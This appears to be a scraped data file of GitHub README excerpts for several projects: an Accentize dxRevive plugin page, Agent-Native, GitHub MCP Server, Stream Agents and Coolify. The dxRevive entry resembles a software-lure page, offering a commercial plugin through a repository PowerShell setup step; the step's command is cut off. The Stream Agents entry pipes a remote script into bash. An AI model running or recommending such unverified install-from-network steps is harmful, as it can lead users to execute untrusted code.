candidates.description: Accentize dxRevive is a dialogue restoration plugin for Windows hosts that uses local neural processing to clean speech. It rebuilds missing frequencies, cuts noise and room tone, and smooths codec artifacts without sending audio online.
candidates.readme_excerpt:
# Accentize dxRevive

Accentize dxRevive is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Accentize dxRevive and work in it.

Accentize dxRevive is a speech restoration plugin aimed at post-production engineers, podcast editors, and dialogue mixers on Windows. It runs as a VST3 insert inside common digital audio workstations and non-linear editors, using optimized neural networks trained on diverse languages and accents. Processing stays entirely on your machine, which keeps turnaround predictable when you handle confidential interviews or client dailies.

A typical session starts when you receive a problematic dialogue stem—Zoom chatter, thin phone audio, or a reverberant room recording. You load the project in your DAW, place dxRevive on the track, pick a restoration profile that matches the material, and raise the main control until speech clears without sounding brittle. In broader workflows you might compare processing modes, narrow spectral focus to problem bands, or toggle A/B states before printing a clean bus or rendering stems for the mix stage.

This repository packages the Windows setup bundle alongside concise operator notes and a version changelog. The setup file reflects the build tested against current 64-bit hosts, while the notes summarize install layouts, supported sample rates, and common routing tips. The changelog records feature refinements and algorithm updates so you can see what changed between releases when updating workstations across a facility.

## What you do with it

- Local neural engines remove broadband noise without uploading stems to external servers.
- Reverb decay and room splash lift off dialogue while preserving natural consonant transients.
- Missing frequency content is re-synthesized so band-limited phone calls regain body.
- Codec grunge from remote conference captures can be reduced before loudness normalization stages.
- Clipped syllables and small dropouts are repaired using learned replacement of lost samples.
- Streamlined controls automate heavy parameter tuning so you focus on mix amount.
- Spectral focus bands let you target harsh sibilance or thin low end on stubborn lines.
- Presets for phone and low-end restore give sensible starting points for common dialogue problems.

## Quick Setup (PowerShell)

This installs the program Accentize dxRevive on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal*

candidates.description: A framework for building agentic apps
candidates.readme_excerpt: # Agent-Native Agent-Native is an open-source TypeScript framework for building agents that pair autonomous work with a purpose-built UI. Define each capability once as an [action](https://agent-native.com/docs/actions-overview?utm_source=github&utm_medium=referral&utm_content=readme): the agent uses it as a tool, and the UI calls it from code. ## Quick start ```bash npx --yes @agent-native/core@latest create my-agent --standalone --template chat ``` Follow the [getting started guide](https://agent-native.com/docs/getting-started?utm_source=github&utm_medium=referral&utm_content=readme) for a full intro to the framework. ## Why build agents with UIs? Coding agents work with more than a text box. Their environment provides context, tools, files, tests, and previews that make their capabilities and results visible. Knowledge work needs that same kind of environment. A UI shows what an agent can do and gives people familiar ways to inspect, edit, approve, and share its work. ## How Agent-Native works - **[Shared actions](https://agent-native.com/docs/actions-overview?utm_source=github&utm_medium=referral&utm_content=readme).** The agent calls each capability as a tool, and the UI calls it from code. Both paths use the same validation, permissions, and implementation. - **[Shared data](https://agent-native.com/docs/server-database?utm_source=github&utm_medium=referral&utm_content=readme).** Work done by the agent appears in the UI, and work done in the UI is available to the agent. - **[Shared application state](https://agent-native.com/docs/context-awareness?utm_source=github&utm_medium=referral&utm_content=readme).** The agent receives relevant UI state, such as the current page, selected record, or active view. The agent does not click through the UI. It works through the same action layer as the UI. ### Example: a shared action Create `actions/hello.ts`: ```ts import { defineAction } from "@agent-native/core/a

candidates.readme_excerpt:
[![Go Report Card](https://goreportcard.com/badge/github.com/github/github-mcp-server/v2)](https://goreportcard.com/report/github.com/github/github-mcp-server/v2)

# GitHub MCP Server

The GitHub MCP Server connects AI tools directly to GitHub's platform. This gives AI agents, assistants, and chatbots the ability to read repositories and code files, manage issues and PRs, analyze code, and automate workflows. All through natural language interactions.

### Use Cases

- Repository Management: Browse and query code, search files, analyze commits, and understand project structure across any repository you have access to.
- Issue & PR Automation: Create, update, and manage issues and pull requests. Let AI help triage bugs, review code changes, and maintain project boards.
- CI/CD & Workflow Intelligence: Monitor GitHub Actions workflow runs, analyze build failures, manage releases, and get insights into your development pipeline.
- Code Analysis: Examine security findings, review Dependabot alerts, understand code patterns, and get comprehensive insights into your codebase.
- Team Collaboration: Access discussions, manage notifications, analyze team activity, and streamline processes for your team.

Built for developers who want to connect their AI tools to GitHub context and capabilities, from simple natural language queries to complex multi-step agent workflows.

### Using the Go module

The Go module path is `github.com/github/github-mcp-server/v2`. Library consumers
must use this prefix in imports, for example
`github.com/github/github-mcp-server/v2/pkg/github`, and in `go get` commands.
No `/v2` subdirectory is needed when building from a repository checkout.

The existing `v2.0.0` tag predates this module-path correction and cannot be used
as a Go module. After this change is merged, a new release such as `v2.0.1` must
be tagged from a commit containing the corrected module path. Until then,
consumers can use a pseudo-version from a commit containing this change.

---

candidates.description: Quickly build text, voice and video agents. Fast, Go based Agent backend with SDKs for every language. Sensible defaults for search, knowledge, skills, telephony, sandboxes, memory and persistence. Sovereign AI. Take control of your AI.
candidates.readme_excerpt:
![StreamAgents](assets/stream_agents.png)

> [!NOTE]
> Using Python for Agents no longer makes sense. For 0.7 we've moved to Go, with SDKs for other languages.

Stream Agents is a Go backend for building text, voice and video agents.
You can build AI/agentic apps like Muse, Decagon and Harvey in a day.

#### It's faster to build agents:

1. Agents are defined in a folder structure + YAML
2. SDKs handle chat/audio client and state
3. All the components you need are integrated with sensible defaults. (Guardrails, Knowledge, Routing, Connectors, Sandboxes, skills, telephony)

#### Performance is excellent:

1. Go runs with high concurrency and great performance
2. The edge acceleration offloads your backend and lowers latency
3. Audio forwarding is optimized with WARP similar to OpenAI

#### Sovereign AI

The combination of routing, persistence and memory makes it easy to switch the underlying models.
Stay in control of how costs scale.
Start with the frontier models and run your own when it makes sense.

## Quickstart

The heavy lifting is done in Go. But you can use the agents in any environment:

Pick your backend language:

* [Python](https://getstream.io/agents/docs/quickstart/?server=python)
* [Go](https://getstream.io/agents/docs/quickstart/?server=go-golang)
* [Node](https://getstream.io/agents/docs/quickstart/?server=javascript)
* [Ruby](https://getstream.io/agents/docs/quickstart/?server=ruby)
* [PHP](https://getstream.io/agents/docs/quickstart/?server=php)
* [.NET](https://getstream.io/agents/docs/quickstart/?server=dotnet-csharp)
* [Rust](https://getstream.io/agents/docs/quickstart/?server=rust)

Then add chat, voice and video to your app with a client SDK:

* [Swift](https://getstream.io/agents/docs/quickstart/?client=swift)
* [Kotlin](https://getstream.io/agents/docs/quickstart/?client=kotlin)
* [React](https://getstream.io/agents/docs/quickstart/?client=react)
* [Flutter](https://getstream.io/agents/docs/quickstart/?client=flutter)
* [React Native](https://getstream.io/agents/docs/quickstart/?client=react-native)

The fastest way to define an agent is using the folder structure

You can quickly create a folder using the CLI

```bash
curl -fsSL https://getstream.io/cli.sh | bash
getstream agents init my-agent --template text
```

    faq.md
    urls.yaml

## What is Coolify? Coolify is an open-source, self-hostable platform for deploying **any application, database, or service** on your own servers. It is an alternative to Heroku, Netlify, and Vercel. It gives you the experience of a managed cloud platform while running on infrastructure you control. This could be a VPS, a bare-metal server, a Raspberry Pi, or even an old laptop running Linux. You only need an SSH connection. Your configurations stay on your servers. If you stop using Coolify, your running resources continue to work and remain manageable. Coolify is fully free and open source, as described in our [philosophy](https://coolify.io/philosophy), with an optional managed service, [Coolify Cloud](https://app.coolify.io). **Nothing is locked behind a paywall.**
